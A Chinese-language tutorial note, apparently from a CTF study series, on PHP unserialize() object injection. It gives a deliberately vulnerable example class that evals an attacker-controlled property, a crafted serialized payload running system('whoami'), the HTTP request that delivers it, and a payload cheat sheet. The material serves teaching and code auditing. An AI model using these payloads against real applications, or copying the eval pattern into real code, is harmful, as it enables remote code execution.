## 一句话概括

`unserialize()` 会**照着字符串里写的类名去实例化对象，并把字符串里的值原样填进属性**。类的方法代码改不了，但方法要用的**数据**完全被攻击者掌握 —— 只要某个方法会把这些数据送进危险函数，就等价于任意代码执行。

## 原理

### 1. 为什么 `unserialize()` 天生危险

一句话拆成三句：

| # | 事实 | 后果 |
|---|---|---|
| 1 | 反序列化会**按数据里声明的类名**实例化对象 | 攻击者能决定「造出哪个类的对象」，而不管业务代码原本想造什么 |
| 2 | 反序列化会**把字符串里的键值对原样写进对象属性**，**与类里预设的默认值无关** | 攻击者能决定「对象里每个属性是什么值」 |
| 3 | 反序列化过程 / 对象销毁时会**自动触发魔术方法** | 攻击者不需要让程序显式调用方法，就能让代码走到「用了那些属性」的地方 |

三条叠在一起：**攻击者拿到了「造什么对象」+「属性是什么」+「方法会自动跑」这三项控制权**。剩下的只看源码里有没有「属性 → 危险函数」的通路。

### 2. 属性值由反序列化数据控制，与默认值无关

```php
class test {
    public $a = 'echo "this is test!!";';   // 类里预设的默认值
}
```

只要 payload 里写的是别的，反序列化出来的对象就是别的：

```php
$malicious = new test();
$malicious->a = "system('whoami');";        // 不是默认值！
```

**类定义里的默认值在反序列化路径上等于「没有」** —— 因为 `unserialize()` 是拿字符串覆盖属性，而不是先跑构造函数再改。

### 3. 反序列化不改变类的成员方法

反序列化**只恢复属性数据，不动方法代码**。所以：

- 方法体（`eval($this->a)` 这一句）是固定不变的；
- 变的只有 `$this->a` 的值。

**推论**：一个类是不是「危险类」，取决于它**把属性用在了哪里**。属性进了 `eval()` / `system()` / `include()` / 文件写入，它就是危险类。

### 4. 攻击原理

```text
构造特殊的序列化字符串
   → 控制反序列化后对象的属性值
   → 等某个方法（业务调用或魔术方法）用到这个属性
   → 该属性被送进危险函数，执行攻击者想要的代码
```

## 本题情景与解题手法

> 下面是原笔记里的**判例代码**（不是靶场题，但结构就是所有反序列化题的最小模型）。

### 题目形态

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class test {
    public $a = 'echo "this is test!!";';
    public function displayVar() {
        eval($this->a);          // ★ 危险函数
    }
}

$c = new test();
$c->displayVar();                // 正常调用 → 输出 this is test!!

$get = $_GET["benben"];          // ★ 可控字符串
$b = unserialize($get);          // ★ 危险入口
$b->displayVar();                // ★ 反序列化后又被调了一次
?>
```

### 第一步：找出口 —— 哪一行会执行代码

`displayVar()` 里是 `eval($this->a)`。`eval()` 会把**字符串当作 PHP 代码执行**：

```php
eval(string $code);
```

所以「`$a` 里能放什么字符串」就等于「能执行什么代码」。

### 第二步：找入口 —— `unserialize()` 的参数可不可控

```php
$get = $_GET["benben"];
$b = unserialize($get);
```

参数直接来自 GET，**完全可控**。而且反序列化出来的对象紧接着就被调了 `displayVar()` —— 连「等魔术方法」都不用，是**最直白的一条链**：

```text
$_GET['benben'] → unserialize() → $b->displayVar() → eval($this->a)
```

### 第三步：构造 payload

要让 `$a` 变成 `system('whoami');`（共 17 字节，注意 `system('whoami');` 的引号和分号都要算）：

```text
O:4:"test":1:{s:1:"a";s:17:"system('whoami');";}
```

对应请求：

```http
GET /?benben=O:4:"test":1:{s:1:"a";s:17:"system('whoami');";} HTTP/1.1
Host: 靶机地址
```

> 原笔记里写的是 `s:20:"system('whoami');"`，20 是数错了。`system('whoami');` 实际是 **17** 个字符：`s y s t e m ( ' w h o a m i ' ) ;` —— 逐字符数一遍是最靠谱的核对方式，长度写错整串直接解析失败。实战里更稳妥的做法是**用 PHP 生成**：

```php
<?php
class test { public $a; }
$o = new test();
$o->a = "system('whoami');";
echo urlencode(serialize($o));
// O%3A4%3A%22test%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D
?>
```

### 第四步：payload 生效的四个环节

| 环节 | 发生了什么 |
|---|---|
| ① 反序列化 | `unserialize($get)` 造出一个 `test` 对象 |
| ② 属性赋值 | 该对象的 `$a` 被写成 `"system('whoami');"` |
| ③ 方法调用 | `$b->displayVar()` 执行 `eval("system('whoami');")` |
| ④ 命令执行 | 执行 `whoami`，回显 `www-data` |

### 注入手法一句话总结

> **危险函数在方法里（`eval($this->a)`）** → **入口参数可控（`$_GET` + `unserialize`）** → **属性直接决定危险函数的参数** → 构造 `O:4:"test":1:{s:1:"a";s:17:"system(...)";}` 把默认值换成命令。

## 利用条件

1. **入口可控**：`unserialize()` 的参数能被攻击者影响；
2. **出口存在**：某个方法（显式调用或魔术方法自动触发）把属性送进危险函数；
3. **属性可写**：payload 里的属性名与类定义一致（含 `private` / `protected` 的 `\0` 前缀）；
4. **字符串合法**：类名长度、属性个数、每个值的长度都要算准。

## Payload 速查

| 目的 | 写法 |
|---|---|
| 最简对象 | `O:4:"test":1:{s:1:"a";s:17:"system('whoami');";}` |
| 属性是数组 | `O:4:"test":1:{s:1:"a";a:1:{i:0;s:2:"id";}}` |
| 属性是对象 | `O:4:"test":1:{s:1:"a";O:4:"evil":1:{s:1:"c";s:13:"system('id');";}}` |
| 靠魔术方法自动触发 | 见 03 / 05 篇（`__destruct` / `__wakeup` / `__toString`） |
| 生成而非手拼 | `echo urlencode(serialize($obj));` |

## 踩坑与备注

- **默认值会被完全覆盖**：不要以为类里写了 `public $a = '安全值';` 就安全，payload 一写就变。
- **长度是最容易错的地方**：原笔记把 `system('whoami');` 数成了 20。**逐字符数**，或者干脆用 `serialize()` 生成，别靠眼估。
- **`error_reporting(0)` 会吞掉报错**：payload 写坏时页面可能只剩空白，注意别把「解析失败」误判成「漏洞不存在」。
- **`eval()` 与 `assert()` 这类函数本身就是「执行字符串」**，它们出现在类方法里就是强信号；审计时优先搜这类函数再往回找属性。
- **反序列化只改数据不改代码**：如果属性最终没被任何方法用到（或只被用在无害的地方），漏洞就不成立。找链的本质是**找「属性 → 危险函数」的通路**，而不是「找 `unserialize`」。
